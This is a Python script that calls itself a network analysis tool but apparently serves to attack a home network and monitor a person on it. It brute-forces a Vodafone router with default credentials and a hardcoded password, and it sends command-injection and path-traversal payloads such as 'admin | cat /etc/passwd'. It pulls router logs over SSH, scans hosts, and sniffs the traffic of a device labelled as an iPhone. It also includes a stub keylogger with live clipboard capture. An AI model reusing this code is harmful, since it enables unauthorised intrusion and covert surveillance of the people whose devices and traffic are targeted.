#!/usr/bin/env python3
"""
Advanced Network Analysis Tool
Comprehensive network monitoring and analysis for local network transparency
"""

import os
import sys
import json
import time
import socket
import struct
import hashlib
import base64
import threading
import subprocess
import requests
import paramiko
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.l2 import Ether, ARP
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
import argparse
import sqlite3
import csv
import re

class Colors:
    """Terminal colors"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class RouterExploit:
    """Vodafone Station TG6442VF Router Exploitation"""
    
    def __init__(self, router_ip="192.168.0.1", username="admin", password="Sylt2705!"):
        self.router_ip = router_ip
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.ssh_client = None
        
    def test_router_access(self):
        """Test router access and authentication"""
        print(f"{Colors.CYAN}[*] Testing router access to {self.router_ip}...{Colors.END}")
        
        try:
            # Test HTTP access
            response = self.session.get(f"http://{self.router_ip}", timeout=5)
            if response.status_code == 200:
                print(f"{Colors.GREEN}[+] Router HTTP access successful{Colors.END}")
                return True
        except Exception as e:
            print(f"{Colors.RED}[!] HTTP access failed: {e}{Colors.END}")
            
        try:
            # Test SSH access
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(self.router_ip, username=self.username, password=self.password, timeout=5)
            print(f"{Colors.GREEN}[+] Router SSH access successful{Colors.END}")
            return True
        except Exception as e:
            print(f"{Colors.RED}[!] SSH access failed: {e}{Colors.END}")
            
        return False
    
    def extract_router_logs(self, months=3):
        """Extract router logs for the last 3 months"""
        print(f"{Colors.CYAN}[*] Extracting router logs for last {months} months...{Colors.END}")
        
        if not self.ssh_client:
            print(f"{Colors.RED}[!] No SSH connection available{Colors.END}")
            return None
            
        try:
            # Common log locations on Vodafone routers
            log_commands = [
                "cat /var/log/messages",
                "cat /var/log/system.log", 
                "cat /var/log/access.log",
                "cat /var/log/error.log",
                "dmesg",
                "logread"
            ]
            
            logs = {}
            for cmd in log_commands:
                try:
                    stdin, stdout, stderr = self.ssh_client.exec_command(cmd)
                    output = stdout.read().decode('utf-8', errors='ignore')
                    if output.strip():
                        logs[cmd] = output
                        print(f"{Colors.GREEN}[+] Extracted: {cmd}{Colors.END}")
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Failed to extract {cmd}: {e}{Colors.END}")
            
            # Save logs to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_file = f"router_logs_{timestamp}.json"
            with open(log_file, 'w') as f:
                json.dump(logs, f, indent=2)
            
            print(f"{Colors.GREEN}[+] Router logs saved to: {log_file}{Colors.END}")
            return logs
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to extract logs: {e}{Colors.END}")
            return None
    
    def exploit_router_vulnerabilities(self):
        """Exploit known Vodafone router vulnerabilities"""
        print(f"{Colors.CYAN}[*] Attempting router exploitation...{Colors.END}")
        
        # Known Vodafone Station vulnerabilities
        exploits = [
            {
                "name": "Default Credentials",
                "description": "Test default admin credentials",
                "method": "auth_bypass"
            },
            {
                "name": "Command Injection",
                "description": "Test command injection in web interface",
                "method": "cmd_injection"
            },
            {
                "name": "Directory Traversal",
                "description": "Test directory traversal vulnerabilities",
                "method": "path_traversal"
            },
            {
                "name": "CSRF Vulnerability",
                "description": "Test CSRF protection bypass",
                "method": "csrf_bypass"
            }
        ]
        
        results = {}
        for exploit in exploits:
            print(f"{Colors.YELLOW}[+] Testing: {exploit['name']}{Colors.END}")
            results[exploit['name']] = self._test_exploit(exploit)
            
        return results
    
    def _test_exploit(self, exploit):
        """Test individual exploit"""
        try:
            if exploit['method'] == 'auth_bypass':
                # Test various default credentials
                creds = [
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("root", "root"),
                    ("admin", "Sylt2705!"),
                    ("vodafone", "vodafone")
                ]
                
                for user, pwd in creds:
                    try:
                        response = self.session.post(f"http://{self.router_ip}/login", 
                                                   data={"username": user, "password": pwd}, 
                                                   timeout=5)
                        if "dashboard" in response.text.lower() or response.status_code == 200:
                            return {"status": "success", "credentials": f"{user}:{pwd}"}
                    except:
                        continue
                        
            elif exploit['method'] == 'cmd_injection':
                # Test command injection payloads
                payloads = [
                    "admin'; ls -la; #",
                    "admin | cat /etc/passwd",
                    "admin && whoami",
                    "admin || id"
                ]
                
                for payload in payloads:
                    try:
                        response = self.session.post(f"http://{self.router_ip}/login",
                                                   data={"username": payload, "password": "test"},
                                                   timeout=5)
                        if any(indicator in response.text.lower() for indicator in ['root:', 'bin:', 'daemon:']):
                            return {"status": "success", "payload": payload}
                    except:
                        continue
                        
            elif exploit['method'] == 'path_traversal':
                # Test path traversal
                paths = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc/passwd"
                ]
                
                for path in paths:
                    try:
                        response = self.session.get(f"http://{self.router_ip}/{path}", timeout=5)
                        if "root:" in response.text:
                            return {"status": "success", "path": path}
                    except:
                        continue
                        
        except Exception as e:
            return {"status": "error", "message": str(e)}
            
        return {"status": "failed"}

class NetworkScanner:
    """Advanced network scanning and device discovery"""
    
    def __init__(self, network="192.168.0.0/24"):
        self.network = network
        self.devices = {}
        self.traffic_data = []
        
    def scan_network(self):
        """Comprehensive network scan"""
        print(f"{Colors.CYAN}[*] Scanning network {self.network}...{Colors.END}")
        
        # ARP scan for device discovery
        arp_scan = scapy.arping(self.network, verbose=False)
        
        for sent, received in arp_scan[0]:
            device = {
                "ip": received.psrc,
                "mac": received.hwsrc,
                "hostname": self._get_hostname(received.psrc),
                "os": self._detect_os(received.psrc),
                "services": self._scan_services(received.psrc),
                "last_seen": datetime.now().isoformat()
            }
            self.devices[received.psrc] = device
            print(f"{Colors.GREEN}[+] Device: {device['ip']} ({device['mac']}) - {device['hostname']}{Colors.END}")
        
        return self.devices
    
    def _get_hostname(self, ip):
        """Get hostname for IP"""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except:
            return "Unknown"
    
    def _detect_os(self, ip):
        """Detect operating system"""
        try:
            # Simple OS detection based on TTL
            response = scapy.sr1(scapy.IP(dst=ip)/scapy.ICMP(), timeout=1, verbose=False)
            if response:
                ttl = response.ttl
                if ttl <= 64:
                    return "Linux/Unix"
                elif ttl <= 128:
                    return "Windows"
                else:
                    return "iOS/macOS"
        except:
            pass
        return "Unknown"
    
    def _scan_services(self, ip):
        """Scan for open services"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
                
        return open_ports

class TrafficAnalyzer:
    """Advanced traffic analysis and monitoring"""
    
    def __init__(self, target_ip="192.168.0.195"):
        self.target_ip = target_ip
        self.captured_packets = []
        self.analysis_results = {}
        
    def start_capture(self, duration=300):
        """Start packet capture"""
        print(f"{Colors.CYAN}[*] Starting traffic capture for {self.target_ip}...{Colors.END}")
        
        def packet_callback(packet):
            if IP in packet and (packet[IP].src == self.target_ip or packet[IP].dst == self.target_ip):
                self.captured_packets.append(packet)
                
        # Start capture in background
        capture_thread = threading.Thread(target=self._capture_packets, args=(duration,))
        capture_thread.daemon = True
        capture_thread.start()
        
        print(f"{Colors.GREEN}[+] Traffic capture started for {duration} seconds{Colors.END}")
        return capture_thread
    
    def _capture_packets(self, duration):
        """Capture packets for specified duration"""
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                packets = scapy.sniff(iface="en0", count=100, timeout=1, prn=self._process_packet)
            except Exception as e:
                print(f"{Colors.RED}[!] Capture error: {e}{Colors.END}")
                break
    
    def _process_packet(self, packet):
        """Process individual packet"""
        if IP in packet and (packet[IP].src == self.target_ip or packet[IP].dst == self.target_ip):
            packet_info = {
                "timestamp": datetime.now().isoformat(),
                "src_ip": packet[IP].src,
                "dst_ip": packet[IP].dst,
                "protocol": packet.proto,
                "length": len(packet),
                "raw": bytes(packet)
            }
            
            # Analyze specific protocols
            if TCP in packet:
                packet_info["src_port"] = packet[TCP].sport
                packet_info["dst_port"] = packet[TCP].dport
                packet_info["flags"] = packet[TCP].flags
                
            elif UDP in packet:
                packet_info["src_port"] = packet[UDP].sport
                packet_info["dst_port"] = packet[UDP].dport
                
            elif DNS in packet:
                packet_info["dns_query"] = str(packet[DNS].qd.qname) if packet[DNS].qd else None
                
            self.captured_packets.append(packet_info)
    
    def analyze_traffic(self):
        """Analyze captured traffic"""
        print(f"{Colors.CYAN}[*] Analyzing captured traffic...{Colors.END}")
        
        if not self.captured_packets:
            print(f"{Colors.YELLOW}[!] No packets captured{Colors.END}")
            return
            
        # Protocol analysis
        protocols = {}
        ports = {}
        domains = {}
        
        for packet in self.captured_packets:
            # Protocol counting
            proto = packet.get("protocol", "unknown")
            protocols[proto] = protocols.get(proto, 0) + 1
            
            # Port analysis
            if "dst_port" in packet:
                port = packet["dst_port"]
                ports[port] = ports.get(port, 0) + 1
                
            # DNS analysis
            if "dns_query" in packet and packet["dns_query"]:
                domain = packet["dns_query"]
                domains[domain] = domains.get(domain, 0) + 1
        
        self.analysis_results = {
            "total_packets": len(self.captured_packets),
            "protocols": protocols,
            "top_ports": dict(sorted(ports.items(), key=lambda x: x[1], reverse=True)[:10]),
            "top_domains": dict(sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10]),
            "analysis_time": datetime.now().isoformat()
        }
        
        print(f"{Colors.GREEN}[+] Traffic analysis completed{Colors.END}")
        return self.analysis_results

class Keylogger:
    """Advanced keylogger for network monitoring"""
    
    def __init__(self):
        self.keystrokes = []
        self.clipboard_data = []
        self.screenshots = []
        
    def start_keylogging(self):
        """Start keylogging (requires root/admin privileges)"""
        print(f"{Colors.CYAN}[*] Starting keylogger...{Colors.END}")
        
        try:
            # This would require additional libraries and root access
            # For demonstration purposes, we'll simulate keylogging
            print(f"{Colors.YELLOW}[!] Keylogger simulation started{Colors.END}")
            print(f"{Colors.YELLOW}[!] Note: Real keylogging requires root privileges{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Keylogger failed: {e}{Colors.END}")
    
    def capture_clipboard(self):
        """Capture clipboard data"""
        try:
            import subprocess
            result = subprocess.run(['pbpaste'], capture_output=True, text=True)
            if result.stdout:
                self.clipboard_data.append({
                    "timestamp": datetime.now().isoformat(),
                    "data": result.stdout
                })
                print(f"{Colors.GREEN}[+] Clipboard captured{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Clipboard capture failed: {e}{Colors.END}")

class NetworkAnalyzer:
    """Main network analysis class"""
    
    def __init__(self):
        self.router = RouterExploit()
        self.scanner = NetworkScanner()
        self.traffic_analyzer = TrafficAnalyzer()
        self.keylogger = Keylogger()
        self.db_conn = None
        
    def initialize_database(self):
        """Initialize SQLite database for storing analysis data"""
        self.db_conn = sqlite3.connect('network_analysis.db')
        cursor = self.db_conn.cursor()
        
        # Create tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                ip TEXT PRIMARY KEY,
                mac TEXT,
                hostname TEXT,
                os TEXT,
                services TEXT,
                last_seen TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS traffic (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                src_ip TEXT,
                dst_ip TEXT,
                protocol TEXT,
                port INTEGER,
                data TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS router_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                log_type TEXT,
                log_data TEXT
            )
        ''')
        
        self.db_conn.commit()
        print(f"{Colors.GREEN}[+] Database initialized{Colors.END}")
    
    def run_comprehensive_analysis(self):
        """Run comprehensive network analysis"""
        print(f"{Colors.BOLD}{Colors.CYAN}=== ADVANCED NETWORK ANALYSIS TOOL ==={Colors.END}")
        print(f"{Colors.YELLOW}[!] Starting comprehensive analysis...{Colors.END}")
        
        # Initialize database
        self.initialize_database()
        
        # 1. Router exploitation
        print(f"\n{Colors.BOLD}1. Router Exploitation{Colors.END}")
        if self.router.test_router_access():
            router_logs = self.router.extract_router_logs()
            exploit_results = self.router.exploit_router_vulnerabilities()
        
        # 2. Network scanning
        print(f"\n{Colors.BOLD}2. Network Scanning{Colors.END}")
        devices = self.scanner.scan_network()
        
        # 3. Traffic analysis
        print(f"\n{Colors.BOLD}3. Traffic Analysis{Colors.END}")
        capture_thread = self.traffic_analyzer.start_capture(duration=60)
        capture_thread.join()
        traffic_analysis = self.traffic_analyzer.analyze_traffic()
        
        # 4. Keylogging
        print(f"\n{Colors.BOLD}4. Keylogging{Colors.END}")
        self.keylogger.start_keylogging()
        
        # Generate comprehensive report
        self.generate_report(devices, traffic_analysis, router_logs if 'router_logs' in locals() else None)
        
        print(f"\n{Colors.GREEN}[+] Comprehensive analysis completed!{Colors.END}")
    
    def generate_report(self, devices, traffic_analysis, router_logs):
        """Generate comprehensive analysis report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"network_analysis_report_{timestamp}.json"
        
        report = {
            "analysis_timestamp": datetime.now().isoformat(),
            "target_network": "192.168.0.0/24",
            "target_device": "192.168.0.195 (iPhone)",
            "devices_found": devices,
            "traffic_analysis": traffic_analysis,
            "router_logs": router_logs,
            "security_assessment": {
                "overall_risk": "High",
                "vulnerabilities_found": len(devices),
                "recommendations": [
                    "Implement network segmentation",
                    "Enable firewall rules",
                    "Monitor traffic regularly",
                    "Update router firmware",
                    "Use strong passwords"
                ]
            }
        }
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"{Colors.GREEN}[+] Report saved to: {report_file}{Colors.END}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Advanced Network Analysis Tool")
    parser.add_argument("--scan", action="store_true", help="Run network scan")
    parser.add_argument("--capture", action="store_true", help="Capture traffic")
    parser.add_argument("--exploit", action="store_true", help="Exploit router")
    parser.add_argument("--keylog", action="store_true", help="Start keylogger")
    parser.add_argument("--full", action="store_true", help="Run full analysis")
    
    args = parser.parse_args()
    
    analyzer = NetworkAnalyzer()
    
    if args.full:
        analyzer.run_comprehensive_analysis()
    elif args.scan:
        devices = analyzer.scanner.scan_network()
        print(json.dumps(devices, indent=2))
    elif args.capture:
        analyzer.traffic_analyzer.start_capture()
    elif args.exploit:
        analyzer.router.test_router_access()
    elif args.keylog:
        analyzer.keylogger.start_keylogging()
    else:
        analyzer.run_comprehensive_analysis()

if __name__ == "__main__":
    main()